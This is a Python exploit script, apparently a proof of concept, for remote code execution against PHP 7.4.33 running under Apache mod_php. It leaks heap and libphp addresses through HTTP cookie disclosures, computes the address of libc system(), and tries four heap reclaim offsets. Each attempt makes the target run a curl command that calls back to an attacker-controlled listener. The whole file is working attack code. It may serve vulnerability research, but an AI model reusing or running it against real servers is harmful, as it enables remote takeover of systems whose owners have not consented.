"""HTTP-only Off-mode RCE with in-band heap and libphp disclosures.

The only bounded search left is four allocator reclaim-chunk positions.  There
is no ASLR page/window brute force, debugger, /proc, Docker API, target-side
file disclosure, or application disclosure endpoint in the final chain.
"""
import argparse
import json
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path

import remote_heap_leak as heap_leak
import remote_libphp_leak as libphp_leak

BASE = Path(__file__).resolve().parent
LIBPHP_TO_LIBC = 0x230C000
LIBC_SYSTEM = 0x45E50
RECLAIM_OFFSETS = (0x457A00, 0x657A00, 0x257A00, 0x857A00)


class Callback:
    def __init__(self, port):
        self.hit = threading.Event()
        self.stop = threading.Event()
        self.server = socket.socket()
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(("0.0.0.0", port))
        self.server.listen(8)
        self.server.settimeout(0.25)
        self.thread = threading.Thread(target=self.run, daemon=True)

    def run(self):
        while not self.stop.is_set():
            try:
                conn, _ = self.server.accept()
            except TimeoutError:
                continue
            with conn:
                try:
                    conn.recv(4096)
                    conn.sendall(b"HTTP/1.1 204 No Content\r\nConnection: close\r\n\r\n")
                except OSError:
                    pass
            self.hit.set()

    def close(self):
        self.stop.set()
        self.thread.join(1)
        self.server.close()


def wait_http(port, timeout=8):
    end = time.time() + timeout
    while time.time() < end:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.3):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def leak_heap(port):
    a, ab = heap_leak.producer()
    heap_leak.post("127.0.0.1", port, a, ab)
    b, bb = heap_leak.consumer()
    raw = heap_leak.cookie_bytes(heap_leak.post("127.0.0.1", port, b, bb))
    return heap_leak.heap_base(raw)[0], len(raw)


def rotate_worker(port):
    # A failed fire can leave a live but allocator-dirty child. Two abort
    # requests make rotation idempotent: either the first kills that child and
    # the second kills its replacement, or both are consumed by the same
    # dying child. The following health wait observes the final replacement.
    for _ in range(2):
        subprocess.run([
            sys.executable, str(BASE / "probe_reclaim.py"),
            "--port", str(port),
            "--pad", "2000000", "--key", "1500000",
        ], cwd=BASE, capture_output=True, text=True, errors="replace", timeout=30)
        time.sleep(0.35)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=17433)
    ap.add_argument("--callback-host", default="192.168.65.254")
    ap.add_argument("--callback-port", type=int, default=8000)
    args = ap.parse_args()
    command = f"curl {args.callback_host}:{args.callback_port}"
    if len(command) > 27:
        ap.error("callback command exceeds the 27-byte carrier")

    callback = Callback(args.callback_port)
    callback.thread.start()
    attempts = []
    try:
        libphp, dtor, lib_cookie, _, _ = libphp_leak.leak_libphp(
            "127.0.0.1", args.port, do_warmup=True)
        if not libphp:
            raise RuntimeError("HTTP libphp leak missed")
        system = libphp + LIBPHP_TO_LIBC + LIBC_SYSTEM
        print(f"[+] libphp={libphp:#x} system={system:#x}", flush=True)

        for number, offset in enumerate(RECLAIM_OFFSETS, 1):
            rotate_worker(args.port)
            if not wait_http(args.port):
                raise RuntimeError("replacement Apache worker did not start")
            heap_leak.warmup("127.0.0.1", args.port)
            heap, heap_cookie_len = leak_heap(args.port)
            if not heap:
                raise RuntimeError("HTTP heap leak missed on fire worker")
            reclaim = heap + offset
            print(f"[{number}/{len(RECLAIM_OFFSETS)}] heap={heap:#x} reclaim={reclaim:#x}", flush=True)
            completed = subprocess.run([
                sys.executable, str(BASE / "probe_reclaim.py"),
                "--port", str(args.port),
                "--chunk", hex(reclaim), "--system", hex(system),
                "--command", command, "--pad", "2000000",
                "--key", "1500000",
            ], cwd=BASE, capture_output=True, text=True, errors="replace", timeout=30)
            attempts.append({"attempt": number, "reclaim_offset": hex(offset),
                             "client_returncode": completed.returncode})
            if callback.hit.wait(1.0):
                result = {
                    "php_version": "7.4.33", "sapi": "Apache mod_php",
                    "display_errors": "Off", "transport": "HTTP only",
                    "result": "RCE callback confirmed", "attempts": number,
                    "maximum_attempts": len(RECLAIM_OFFSETS),
                    "heap_base": hex(heap), "libphp_base": hex(libphp),
                    "zval_ptr_dtor": hex(dtor), "libc_system": hex(system),
                    "heap_cookie_bytes": heap_cookie_len,
                    "libphp_cookie_bytes": len(lib_cookie),
                    "reclaim_offset": hex(offset), "command": command,
                    "notes": "ASLR addresses came from HTTP Set-Cookie disclosures; only four allocator layouts are tried."
                }
                evidence = BASE / "evidence"
                evidence.mkdir(exist_ok=True)
                (evidence / "remote-rce-no-aslr-bruteforce.json").write_text(
                    json.dumps(result, indent=2), encoding="utf-8")
                print(json.dumps(result, indent=2))
                return 0
        (BASE / "evidence" / "remote-rce-bounded-attempts.json").write_text(
            json.dumps(attempts, indent=2), encoding="utf-8")
        print("[-] callback not observed in the four allocator layouts")
        return 1
    finally:
        callback.close()


if __name__ == "__main__":
    raise SystemExit(main())
